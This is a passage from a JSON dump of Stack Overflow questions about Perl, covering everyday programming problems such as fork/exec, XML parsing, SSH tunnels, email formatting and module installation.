rel=\"nofollow\">http://s.example.com/x?list=hahaha&amp;a=&amp;b=&amp;c=&amp;1</a></p>\n\n<p>so all parameters with &amp;a=&amp;b=&amp;c=&amp;1 etc.etc.etc.</p>\n\n<p>this is the output i expect?</p>\n\n<pre><code>for (1..10){\n\n#random this http://s.example.com/x?list=hahaha&amp;a=&amp;b=&amp;c=&amp;1\n#to be like this\n\n\nprint \"\\n\";\n#http://s.example.com/x?list=hahaha&amp;b=&amp;a=&amp;c=&amp;1\n#http://s.example.com/x?list=hahaha&amp;c=&amp;a=&amp;b=&amp;1\n##http://s.example.com/x?list=hahaha&amp;1=&amp;b=&amp;1=&amp;c\n\n}\n</code></pre>\n\n<p>So could anyone help with this??</p>\n\n<p>Thnx allready</p>\n"},{"tags":["perl","operators","dereference"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":144,"score":5,"question_id":12617944,"title":"Is there a convenience for safe dereferencing in Perl?","body":"<p>So perl5porters is discussing to add a safe dereferencing operator, to allow stuff like</p>\n\n<pre><code>$ceo_car_color = $company-&gt;ceo-&gt;car-&gt;color\n    if  defined $company\n    and defined $company-&gt;ceo\n    and defined $company-&gt;ceo-&gt;car;\n</code></pre>\n\n<p>to be shortened to e.g.</p>\n\n<pre><code>$ceo_car_color = $company-&gt;&gt;ceo-&gt;&gt;car-&gt;&gt;color;\n</code></pre>\n\n<p>where <code>$foo-&gt;&gt;bar</code> means <code>defined $foo ? $foo-&gt;bar : undef</code>.</p>\n\n<p><strong>The question:</strong> Is there some module or unobstrusive hack that gets me this operator, or similar behavior with a visually pleasing syntax?</p>\n\n<p>For your enjoyment, I'll list ideas that I was able to come up with.</p>\n\n<ol>\n<li><p>A multiple derefencing method (looks ugly).</p>\n\n<pre><code>sub multicall {\n    my $instance = shift // return undef;\n    for my $method (@_) {\n        $instance = $instance-&gt;$method() // return undef;\n    }\n    return $instance;\n}\n\n$ceo_car_color = multicall($company, qw(ceo car color));\n</code></pre></li>\n<li><p>A wrapper that turns <code>undef</code> into a proxy object (looks even uglier) which returns <code>undef</code> from all function calls.</p>\n\n<pre><code>{ package Safe; sub AUTOLOAD { return undef } }\nsub safe { (shift) // bless {}, 'Safe' }\n\n$ceo_car_color = safe(safe(safe($company)-&gt;ceo)-&gt;car)-&gt;color;\n</code></pre></li>\n<li><p>Since I have access to the implementations of <code>ceo()</code>, <code>car()</code> and <code>color()</code>, I thought about returning the safe proxy directly from these methods, but then existing code might break:</p>\n\n<pre><code>my $ceo = $company-&gt;ceo;\nmy $car = $ceo-&gt;car if defined $ceo; # defined() breaks\n</code></pre>\n\n<p>Unfortunately, I don't see anything in <code>perldoc overload</code> about overloading the meaning of <code>defined</code> and <code>//</code> in my safe proxy.</p></li>\n</ol>\n"},{"tags":["perl","ubuntu","apt"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12618314,"title":"APT Error: Depends: perl (= 5.14.2-6ubuntu2) but 5.14.2-6ubuntu2.1 is to be installed","body":"<p>I just try install libperl-dev with apt on Ubuntu, but I have following error:</p>\n\n<pre><code>user@comp-2:~$ sudo apt-get install libperl-dev\nReading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nSome packages could not be installed. This may mean that you have\nrequested an impossible situation or if you are using the unstable\ndistribution that some required packages have not yet been created\nor been moved out of Incoming.\nThe following information may help to resolve the situation:\n\nThe following packages have unmet dependencies:\n libperl-dev : Depends: perl (= 5.14.2-6ubuntu2) but 5.14.2-6ubuntu2.1 is to be installed\n               Depends: libperl5.14 (= 5.14.2-6ubuntu2) but 5.14.2-6ubuntu2.1 is to be installed\nE: Unable to correct problems, you have held broken packages.\n</code></pre>\n\n<p>I tried to google the problem but didn't found something clear.<br>\nCan some one explain me what it's mean: \"Depends: libperl5.14 (= 5.14.2-6ubuntu2) but 5.14.2-6ubuntu2.1 is to be installed\", and how to solve it?<br>\nThank you for ahead.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":63,"score":4,"question_id":12617318,"title":"Are filehandles in perl global?","body":"<pre><code>#!/usr/local/bin/perl\nsub trial\n{\n    open (LOGFILE, 'C:\\Users\\out.txt');\n    trial();\n}\ntrial();\n</code></pre>\n\n<p><em>Please ignore that it will go into an infinite loop.</em></p>\n\n<p>Will the filehandle <code>LOGFILE</code> be local or private to the method?\nIf no, how can I make it private/local?\nI'm aware of <strong>my</strong> . But I don't know how to use it on File Handles.</p>\n"},{"tags":["perl","passwords","scp"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2190,"score":3,"question_id":3824878,"title":"How can I transfer a file using scp without a password from a Perl script?","body":"<p>I am writing a Perl script that needs to transfer files between computers using scp. I know about public key authentication, but I need the script to be fully automated, so I can't visit the machines to set up the keys before the script is run.</p>\n\n<p>Is there any way to either pass the password to scp from the Perl script or set up the keys from within the perl script?</p>\n\n<p>This script will be run as part of a build script that also reimages the hard drive I need to run the script on. So I can't be there to set up keys every time the project is built.</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12601378,"title":"Do dangerous thing, if fails, try to fix it and do again. If it still fails, give up","body":"<p>I am looking for the nice form of</p>\n\n<pre><code>if (! write_to_file($data) )\n{\n    open_this_file($file_name)\n    write_to_file($data) or die \"Cant write to $file_name\" ;\n}\n</code></pre>\n\n<p>it looks very unclear, is not it? How to write it self-explaining?</p>\n"},{"tags":["perl","ssh","telnet","perlscript"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":12616671,"title":"Run a perl script on remote machine from local machine using Telnet or SSH with Perl","body":"<p>i want to run a Perl script in a remote machine using telnet or ssh.  the script is on my local host.how can do this. can anyone please help me on this?</p>\n"},{"tags":["perl","excel","parsing","encoding","accented-strings"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":113,"score":0,"question_id":12607308,"title":"Fetching Asian (Japanese / Chinese) characters from Excel file into TSV format using Perl's Spreadsheet::ParseExcel","body":"<p>Friends, \nI am preparing a TSV file from excel file, containing Chinese (special) characters as follows - The Seonjeongneung ... Jeonghyeon (è²é¡¯çå, 1462â1530) .....</p>\n\n<p>I have tried using perl CPAN's Spreadsheet::ParseExcel and Spreadsheet::ParseExcel::FmtJapan. But no success. These characters are appearing as ?? in the TSV file, when opened in VIM.</p>\n\n<p>I also tried \" binmode STDOUT, ':utf8'; \" and \" binmode STDOUT, ':encoding(cp932)'; \"</p>\n\n<p>Please help me out, finding a way to extract information from Excel sheets and getting into TSV format.</p>\n\n<p>PS : Excel allows direct save as TSV, but the output was screwed up there as well</p>\n"},{"tags":["perl","clearcase"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12616289,"title":"Can clear case perl - ccperl handle with a path contains spaces?","body":"<p>I'm trying to open a file with path contains space, say:</p>\n\n<pre><code>open(FILE, \"some\\\\path with spaces\")\n</code></pre>\n\n<p>I'm working with <code>ccperl</code> on Windows, and I get an error <em>\"can't open file\"</em>.</p>\n\n<p>I've already tried <code>q!\"...\"!</code> tried <code>\"\\path\\ with\\ spaces\"</code> and many more...</p>\n\n<p>Any idea?</p>\n"},{"tags":["perl","excel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12614097,"title":"How to give currrent directory as Path name while reading an Excel file?","body":"<p>I am trying to update an already existing Excel file \"Test.xls\"  Now, instead of giving the complete path of the Test.xls file, I wish to know how to read the Test.xls file from current directory. I am using Eclipse in Windows environment. Below is my code:</p>\n\n<pre><code>my $Excel = Win32::OLE-&gt;GetActiveObject('Excel.Application')\n|| Win32::OLE-&gt;new('Excel.Application', 'Quit');  \n\nmy $Book = $Excel-&gt;Workbooks-&gt;Open(\"Test.xls\"); #This line throws an error but works if I give complete path name as D:/eclipse/workspace/testing/Test.xls\n\nmy $Sheet = $Book-&gt;Worksheets(1);\n\nforeach my $data (@ifrules)\n{\n $Sheet-&gt;Cells($row,$col)-&gt;{'Value'} =$data;\n $row++;\n}\n\n$Book-&gt;Close; \n</code></pre>\n\n<p>I have tried various options like <em>./Test.xls, .\\Test.xls</em> and others too.\nPlease advice.</p>\n"},{"tags":["perl","parallel-processing","exec","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":134,"score":3,"question_id":12591537,"title":"perl fork() & exec()","body":"<p>I'm trying to grasp the concept of fork() &amp; exec() for my own learning purposes. I'm trying to use perl fork as a second identical process, and then use that to exec a .sh script. </p>\n\n<p>If I use fork() &amp; exec() can I get the .sh script to run in parallel to my perl script? Perl script doesn't wait on the child process and continues on its execution. So my perl script doesn't care about the output of the child process, but only that the command is valid and running. Sort of like calling the script to run in the background.</p>\n\n<p>Is there some sort of safety I can implement to know that the child process exited correctly as well? </p>\n"},{"tags":["multithreading","perl","multicore"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":198,"score":4,"question_id":12536064,"title":"How does Perl's threading system work?","body":"<p><a href=\"http://perldoc.perl.org/threads.html\" rel=\"nofollow\">Perl's documentation</a> says:\n<em>Since Perl 5.8, thread programming has been available using a model called interpreter threads which provides a new Perl interpreter for each thread</em></p>\n\n<p>Using <code>ps -Lm &lt;pid&gt;</code> with the program below I can see that threads run in parallel, i.e., they are being run at the same time in different cores.  But even when there is 4 threads (3 and the main) <code>ps aux</code> shows only one Perl process. </p>\n\n<ol>\n<li><strong>Does this mean that there is a whole <em>Perl interpreter</em> on each thread?</strong></li>\n<li><strong>Are <em>Perl threads</em> mapped to <em>system threads</em>?</strong></li>\n<li><strong>If 2 is true, how is possible to have multiple Perl interpreters within a single process?</strong></li>\n</ol>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use threads;\n\n$thr = threads-&gt;new(\\&amp;sub1);\n$thr2 = threads-&gt;new(\\&amp;sub1);\n$thr3 = threads-&gt;new(\\&amp;sub1);\n\nsub sub1 { \n      $i = 0;\n      while(true){\n        $i = int(rand(10)) + $i;\n      }\n}\n\n\n$thr-&gt;join;\n</code></pre>\n"},{"tags":["python","mysql","perl","shell"],"answer_count":8,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":124,"score":3,"question_id":12611035,"title":"statistics with \"group by\" or \"uniq\"","body":"<p>I have the following \"basefile.csv\"</p>\n\n<pre><code>AAM7676,2012-02-02 11:55:52,32,2012-02-03 19:55:30,62,1\nAAM7676,2012-02-11 13:56:11,32,2012-02-12 21:00:18,52,2\nAAM7676,2012-02-21 16:30:55,32,2012-02-23 13:29:41,62,1\nAAM7676,2012-03-07 20:03:32,32,2012-03-09 13:31:35,62,1\nAAM7676,2012-05-28 06:08:05,32,2012-05-29 15:49:55,52,2\nAAM7676,2012-08-22 12:47:28,32,2012-08-24 08:03:09,52,1\nAAO9229,2012-01-10 07:19:29,32,2012-01-11 16:39:16,52,2\nAAP0678,2012-04-09 16:35:19,32,2012-04-10 19:46:55,52,2\nAAP0678,2012-04-30 16:44:28,32,2012-05-01 19:20:00,52,2\nAAP0678,2012-06-01 19:31:34,32,2012-06-03 10:34:33,52,3\nAAU6100,2012-01-09 17:49:13,32,2012-01-11 02:00:33,52,3\nAAU6100,2012-01-20 21:18:16,32,2012-01-22 14:09:00,52,3\nAAU6100,2012-02-20 13:35:39,32,2012-02-21 19:45:55,52,2\nAAU6100,2012-03-13 09:50:51,32,2012-03-14 22:35:51,52,3\n</code></pre>\n\n<p>Based on column 1 (car plate) and column 4 (date-time), I'd like to make statistics to show how many times per month (column 4) a plate (column 1) occurs.</p>\n\n<p>Final format, should be:</p>\n\n<pre><code>plate,jan,feb,mar,abr,may,jun,jul,aug,sep.oct,nov,dec,total\nAAM7676,0,3,1,0,1,0,0,1,0,0,0,0,6\nAAO9229,1,0,0,0,0,0,0,0,0,0,0,0,1\nAAP0678,0,0,0,1,1,1,0,0,0,0,0,0,3\nAAU6100,2,1,1,0,0,0,0,0,0,0,0,0,4\n</code></pre>\n\n<p>I have already played with (and searched for solutions) shell script and MySQL without figuring out how to solve it... probably because I'm a newbie....</p>\n\n<p>Any kind of solution will be welcomed (MySQL, sh, perl, python, ...)</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12588021,"title":"Perl: Formatted output to email body","body":"<p>I am generating a formatted text output using perl's format syntax, then I slurp the entire output to a scalar variable and when I send this as email body, entire text looses its formatting , funny thing is when I copy and paste the received emails body to a text editor (notepad) it pastes as original formatted text.\nI tried different encoding but nothing helped sending as html is even worse.\nAny pointers that could resolve this issue would be much appreciated.\nFor email I am using MIME::Lite and  Net::SMTP.\nThanks\n/G</p>\n\n<p>Edit: Here is the code I used to send the email:</p>\n\n<pre><code>$msg = MIME::Lite-&gt;new(\n    From    =&gt; 'username@domain.com',\n    To      =&gt; 'username2@domain.com',\n    Cc      =&gt; '',\n    Subject =&gt; 'Helloooooo,!',\n    Type    =&gt; 'multipart/related',\n);\n\n$msg-&gt;attach(\n    Type =&gt; 'text/plain charset=ANSI',\n    Data =&gt; encode(\"Windows-1250\", $data)\n);\n\n$msg-&gt;send('smtp', 'smtp.domain', Debug=&gt;0);\n</code></pre>\n"},{"tags":["perl","bash","ubuntu","command"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12610873,"title":"How to make this command safe, and work for quoted strings","body":"<p>I found (and adapted a bit) a command to edit a list of files using regex (and perl). I put it into a script file called <code>cred</code>, so I can do <code>cred . england England</code> to replace all occurrences of <code>england</code> with <code>England</code> in all files in the current directory.</p>\n\n<pre><code>find $1 -type f -exec perl -e 's/'$2'/'$3'/g' -p -i {} \\;\n</code></pre>\n\n<p>It is wicked powerful, and already useful - but dangerous, and flawed. I would like it to...</p>\n\n<ol>\n<li>preview changes (or at least files operated on) first, asking confirmation</li>\n<li>work with longer strings than a single word. I tried <code>cred . england 'the United Kingdom'</code> but it fails</li>\n</ol>\n\n<p>I would also be interested in other (short and memorable, universally installed/installable on osx and ubuntu) commands to achieve the same thing.</p>\n\n<p>EDIT:</p>\n\n<p>This is what I have so far - open to improvements...</p>\n\n<pre><code># highlight the spots that will be modified (not specifying the file)\nfind $1 -type f -exec grep -E \"$2\" --color {} \\;\n# get confirmation\nread -p \"Are you sure? \" -n 1 -r\nif [[ $REPLY =~ ^[Yy]$ ]]\nthen\n  # make changes, and highlight the spots that were changed\n  find $1 -type f -exec perl -e \"s/$2/$3/g\" -p -i {} \\;\n  echo \"\"\n  find $1 -type f -exec grep -E \"$3\" --color {} \\;\nelse\n  echo \"\"\n  echo \"Aborted!!\"\nfi\n</code></pre>\n"},{"tags":["perl","debugging"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12612940,"title":"got \"dumpvar.pl not available\" message when debugging a perl script","body":"<p>I got the following error message when debugging a perl script.</p>\n\n<blockquote>\n  <p>\"dumpvar.pl not available\"</p>\n</blockquote>\n\n<p>I can enter into debug mode, but when I use the x command to check a variable's value, the error message show up, what's wrong? </p>\n\n<p>my perl version as below</p>\n\n<blockquote>\n  <p>This is perl, v5.8.8 built for sun4-solaris</p>\n</blockquote>\n\n<p>my OS info as below</p>\n\n<blockquote>\n  <p>SunOS 5.10 Generic_118822-30 sun4u sparc SUNW,Sun-Fire-V440</p>\n</blockquote>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12582028,"title":"Data types for parameters of subroutines / functions?","body":"<p>In Perl, can one specifiy data types for the parameters of subroutines? E.g. when using a dualvar in a numeric context like exit:</p>\n\n<pre><code>use constant NOTIFY_DIE_MAIL_SEND_FAILED       =&gt; dualvar 3, 'NOTIFY_DIE_MAIL_SEND_FAILED';\nexit NOTIFY_DIE_MAIL_SEND_FAILED;\n</code></pre>\n\n<p>How does Perl in that case know, that exit expects a numeric parameter? I didn't see a way to define data types for the parameters of subroutines like you do it in Java? (where I could understand how the data type is known as it is explicitely defined)</p>\n"},{"tags":["vb.net","perl","script","outlook","microsoft"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12608741,"title":"Can Perl or VB script access an email folder in outlook, find and open a hyperlink (in IE) in each email and save the linked document to a folder?","body":"<p>I'm not proficient at developing/using scripts and wanted to know if something already exists that I could plug in to a rule using MS Outlook.  I have all emails with a particular topic being saved to an Outlook folder and there is an option (in the advanced rule settings) to run a script on the email when it arrives? Can Perl, VB or similar program scan the content of the email to the hyperlink(s), open up the link in IE and save the document (pdf) to a folder on my computer?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12610758,"title":"Perl String to Base36","body":"<p>How do I convert a string to base36 (0-9,a-z) in perl?</p>\n\n<p>I want to convert IP addresses to base36 with a one to one map, so I can use them in a URL.</p>\n\n<p><code>127.0.0.1</code>\n=== string ==> <code>127000000001</code> === base36 ==></p>\n\n<p><code>72.98.234.11</code> \n=== string ==> <code>072098234011</code> === base36 ==></p>\n"},{"tags":["perl","module","version"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12611364,"title":"How can I tell the lowest required version number of a Perl module?","body":"<p>I'm writing a Perl module and right now I'm including in <code>Makefile.PL</code> all of the dependencies. The only problem is I have all of the latest versions of the modules required, but I don't want to limit anyone who has early versions (and either can't update them or requires older versions for old code). Is there any way to find out what would be the lowest version usable with my module without downloading and testing all of the versions? Thanks!</p>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":333,"score":2,"question_id":6141088,"title":"append a text on the top of the file","body":"<p>I want to add a text on the top of  my data.txt file, this code add the text at the end of the file. how I can modify this code to write the text on the top of my data.txt file. thanks in advance for any assistance.</p>\n\n<pre><code>open (MYFILE, '&gt;&gt;data.txt');\nprint MYFILE \"Title\\n\";\nclose (MYFILE)\n</code></pre>\n"},{"tags":["perl","gpg","pgp"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12610857,"title":"Perl PGP in memory encryption that uses GPG","body":"<p><a href=\"http://stackoverflow.com/q/12540226/206466\">I tried using Crypt::OpenPGP but encountered some issues decrypting GPG encrypted messages.</a> So now I'm looking for alternatives. I would like the module to be able to do its encryption/decryption entirely in memory, because we'd like to ensure that the data isn't exposed on disk at any time in an unencrypted state. The server will have a <code>gpg</code> of version 2.x which it seems not all modules support. Is there a good module for me to use that will work? I'm finding sifting through these modules a little hard, because there doesn't seem to be one \"best\" module, and they are of varying ages.</p>\n"},{"tags":["xml","perl","xml-parsing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12418228,"title":"Parsing Through Perl XML Data","body":"<p>I'm just learning PERL.  I've read some docs on parsing XML and reused some of my colleague's code.  But I can't seem to get it to simply print out a list of the 3 football player names in this data.  Please help.  Here is the PERL code:</p>\n\n<pre><code>    #! /usr/bin/perl -w\nuse strict;\nuse DBI;\nuse XML::Simple;\nuse LWP::UserAgent;\nuse HTTP::Request;\nuse Time::gmtime;\nuse Time::Local;\nuse Data::Dumper;\n\nsub statsInit(){\n  my $xml_api_url = \"http://myprovider.com/nfldata.xml\";\n  my $xml = getXML($xml_api_url);\n  my $xmlData = xml2Simple($xml);\n  print \"Hello World\";\n  foreach my $player (@{$xmlData-&gt;{player}}){\n    my $playername = $player-&gt;{name};\n    print \"pn = $playername | \";\n  }\n}\n\n\nsub getXML($){\n    my ($xmlURL) = @_;\n    my $dataresponse = '';\n    my $agent = LWP::UserAgent-&gt;new(env_proxy =&gt; 1, keep_alive =&gt; 1, timeout =&gt; 100);\n    my $header = HTTP::Request-&gt;new(GET =&gt; $xmlURL);\n    my $request = HTTP::Request-&gt;new('GET', $xmlURL, $header);\n    my $response = $agent-&gt;request($request);\n    if($response-&gt;is_success){\n        $dataresponse = $response-&gt;content(); #Loaded data from FINAL_XML\n    }\n    return $dataresponse;\n}\n\nsub xml2Simple(){\n    my ($xml) = @_;\n    my $xmlObj = XML::Simple-&gt;new(KeyAttr =&gt; {});\n    my $xmlData = '';\n    my $parsedData = '';\n    if($xml){\n        $xmlData = $xmlObj-&gt;XMLin($xml);\n    }\n    return $xmlData;\n}\n\nstatsInit();\n-------- NOW BELOW IS THE RETRIEVED XML DATA --------\n    &lt;season xmlns=\"http://myprovider.com/schema/nfl/statistics-v1.0.xsd\" season=\"2012\" season_type=\"REG\"&gt;\n&lt;team id=\"BUF\" name=\"Bills\" market=\"Buffalo\"&gt;\n    &lt;players&gt;\n        &lt;player id=\"100\" name=\"Nick Barnett\" games_played=\"1\" games_started=\"1\" jersey=\"50\" position=\"OLB\"&gt;\n            &lt;defense tackle=\"7\" ast=\"2\" /&gt;\n        &lt;/player&gt;\n        &lt;player id=\"101\" name=\"Ryan Fitzpatrick\" games_played=\"1\" games_started=\"1\" jersey=\"14\" position=\"QB\"&gt;\n            &lt;rushing att=\"2\" yds=\"8\" /&gt;\n            &lt;passing att=\"32\" cmp=\"18\" yds=\"195\" td=\"3\" int=\"3\"/&gt;\n        &lt;/player&gt;\n        &lt;player id=\"102\" name=\"Fred Jackson\" games_played=\"1\" games_started=\"1\" jersey=\"22\" position=\"RB\"&gt;\n            &lt;rushing att=\"6\" yds=\"15\" td=\"0\"/&gt;\n        &lt;/player&gt;\n    &lt;/players&gt;\n&lt;/team&gt;\n&lt;/season&gt;\n</code></pre>\n\n<p>So my code seems to retrieve the data ok, and I get no errors.  \"Hello World\" gets printed.  But it never goes into the players loop and doesn't print any player names.  What am I doing wrong?</p>\n"},{"tags":["xml","perl","xml-parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12480286,"title":"Perl XML Parser and Expat","body":"<p>I have a huge XML file with loads of data, I need to create a perl script which will parse the XML and extract only the data that is needed.</p>\n\n<p>Iv been told to use expat, i was wondering if any one had any good tutroial or articles on how to use perl and expat to parse XML.</p>\n\n<p>hope this makes sense im really new to perl.</p>\n"},{"tags":["perl","apache","apache2","mod-perl","mod-perl2"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":914,"score":2,"question_id":11128015,"title":"Installing mod_perl-2.0.7 on Apache httpd-2.4.2","body":"<p>I am having an infuriating time trying to get an install of apache with perl. I am following the instructions on the mod_perl site located here: <a href=\"http://perl.apache.org/docs/2.0/user/install/install.html\" rel=\"nofollow\">http://perl.apache.org/docs/2.0/user/install/install.html</a></p>\n\n<p>I get as far as the part where it asks me to run this command, but I get an error:</p>\n\n<pre><code>$ perl Makefile.PL MP_APXS=/usr/local/httpd/prefork/bin/apxs\nReading Makefile.PL args from @ARGV\n   MP_APXS = /usr/local/httpd/prefork/bin/apxs\nno conflicting prior mod_perl version found - good.\nConfiguring Apache/2.4.2 mod_perl/2.0.7 Perl/v5.12.3\n[  error] Can't find apr include/ directory,\n[  error] use MP_APR_CONFIG=/path/to/apr-config\n</code></pre>\n\n<p>I ran the commands they suggested for installing apache to install my apache:</p>\n\n<pre><code>  $ ./configure --prefix=$HOME/httpd/prefork --with-mpm=prefork\n  $ make &amp;&amp; make install\n</code></pre>\n\n<p>But I am not sure where this apr-config thing is supposed to be as it doesn't appear to be anywhere in my apache2 folder.</p>\n\n<p>If it might be an issue, I am using Mac OS X 10.7.3. I know an apache server comes with Mac OS X, but I need to do this install on a different computer from the ground up, so I have to start this whole install from the ground up on my computer.</p>\n\n<p>Thanks ahead of time for any help you can provide.</p>\n"},{"tags":["regex","perl","exception-handling","die"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":87,"score":1,"question_id":12609040,"title":"What's a reliable way to sanitize a die string, removing the \" at File.pm line 123\"?","body":"<p>Sometimes I'd like to handle a Perl string exception that comes with the \" at File.pm line 123\" on the end of it by outputting it somewhere. However, I don't really want to expose that last bit with the path name, the line number, etc.</p>\n\n<p>Over time I've come up with several possible solutions and I've liked none of them very well. Just using a regular expression like this is one obvious one:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>s/\\s+ at \\s+ .*$//xms;\n</code></pre>\n\n<p>but has the problem that it will kill just about anything with the word \" at \" in it. Making the line number non-optional helps, but then you end up with anonymous code having \" at ANON\" or something similarly grotesque staying on.</p>\n\n<p>I have even tried something like this:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>$_ = reverse $_;\ns/^.*? \\s+ ta \\s+//xms;\n$_ = reverse $_;\n</code></pre>\n\n<p>which works pretty well on one-line errors. But if you end up with a full stack trace from <code>confess</code> or some other exception thrower, you end up with the long stack trace in place.</p>\n\n<p>Anyone have a good solution they'd care to share? Or a suggestion on a better way? (\"Don't output the die message like that\" is not an acceptable answer.) </p>\n\n<p>If there's a CPAN module I've overlooked to help here, I'd love to know. If not, I'm thinking of contributing a CPAN module for this purpose.</p>\n"},{"tags":["linux","perl","process","exec","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":180,"score":0,"question_id":12608058,"title":"perl fork() exec() , child process gone wild","body":"<p>Linux</p>\n\n<p>.sh is in tcsh</p>\n\n<p>Hi, I made a very basic fork and exec, but I need help in implementing safeties to it. Basically my perl script calls a .sh script in a child process. But when I do ctrl+c to kill the parent, the signal gets ignored by the child. </p>\n\n<p>1) How do I capture the SIGINT for the child process as well?</p>\n\n<p>2) The child process that runs the .sh script still STDOUT to the screen of the xterm. How can I remove this? I was thinking of doing running the script in the background   \" exec(\"shell.sh args &amp;\"); \". But haven't tested as I need to figure out how to keep the child from going wild first.</p>\n\n<p>3) The parent process(perl script) doesn't wait on the child(.sh script). So I've  read alot about the child becoming a zombie??? Will it happen after the script is done? And how would I stop it?</p>\n\n<p>Thanks all!</p>\n\n<pre><code>$pid = fork();\nif($pid &lt; 0){\n    print \"Failed to fork process... Exiting\";\n    exit(-1);\n    }\nelsif ($pid ==0) {\n    #child process\n    exec(\"shell.sh args\");\n    exit(1);\n    }\nelse { #execute rest of parent}\n</code></pre>\n"},{"tags":["perl","unix","stdout","csh"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12587883,"title":"Perl script redirect stderr and stdout to a file","body":"<p>I'm having trouble doing this. My script prints messages to stout and stderr, and I want them all to be directed to a file that I can view at my leisure later. </p>\n\n<p>Here is what I tried: </p>\n\n<pre><code>$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 &amp;&gt;myscript.log\n</code></pre>\n\n<p>So my script has a few arguments that I need to set, then I try <strong>&amp;>myscript.log</strong> to create this log file and redirect there. However I get \"Invalid null command\" and when I press up on the key pad it shows the command I tried executing as:</p>\n\n<pre><code>$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 &amp; &gt; myscript.log\n</code></pre>\n\n<p>I think my syntax is wrong or something. </p>\n\n<p>Thanks.</p>\n"},{"tags":["linux","perl","telnet","ssh-tunnel"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":133,"score":4,"question_id":12605197,"title":"Checking if an SSH tunnel is up and running","body":"<p>I have a perl script which, when destilled a bit, looks like this:</p>\n\n<pre><code>my $randport = int(10000 + rand(1000));          # Random port as other scripts like this run at the same time\nmy $localip = '192.168.100.' . ($port - 4000);   # Don't ask... backwards compatibility\nsystem(\"ssh -NL $randport:$localip:23 root\\@$ip -o ConnectTimeout=60 -i somekey &amp;\");    # create the tunnel in the background\n\nsleep 10;       # Give the tunnel some time to come up\n\n# Create the telnet object\nmy $telnet = new Net::Telnet(\n        Timeout =&gt;      10,\n        Host    =&gt;      'localhost',\n        Port    =&gt;      $randport,\n        Telnetmode =&gt;   0,\n        Errmode =&gt;      \\&amp;fail,\n);\n\n# SNIPPED... a bunch of parsing data from $telnet\n</code></pre>\n\n<p>The thing is that the target $ip is on a link with very unpredictable bandwidth, so the tunnel might come up right away, it might take a while, it might not come up at all. So a sleep is necessary to give the tunnel some time to get up and running.</p>\n\n<p>So the question is: How can i test if the tunnel is up and running? 10 seconds is a really undesirable delay if the tunnel comes up straight away. Ideally, i would like to check if it's up and continue with creating the telnet object once it is, to a maximum of, say, 30 seconds.</p>\n\n<p><strong>Edit:</strong> Ping doesn't help me mouch, as the remote end of the tunnel is generally up, but with a very high amount of packetloss</p>\n\n<p><strong>Solved:</strong> Extrapolating from the tip suggested by mikebabcock, <code>sleep 10</code> has been replaced with this block which works like a charm:</p>\n\n<pre><code>my $starttime = time();\nwhile (1)\n{\n    # Check for success\n    if (system(\"nc -dzw10 localhost $randport &gt; /dev/null\") == 0) { last }\n\n    # Check for timeout\n    if (time() &gt; $starttime + 30) { &amp;fail() }\n\n    # 250ms delay before recheck\n    select (undef, undef, undef, 0.25);\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":6,"view_count":97,"score":-4,"question_id":9983397,"title":"Perl script to make last 4 characters of file name all caps","body":"<p>What would the line be that makes the last 4 characters of a file name all caps? I am trying to take a file name from a.) gh4567_yh7l_jk12 to b.) gh4567_yh7l_JK12 I need it to make the last four characters all caps without changing the first characters. </p>\n\n<pre><code>#!/usr/bin/perl\n\nchdir \"folder path\";\n\n@files = `ls *.tif`; chomp 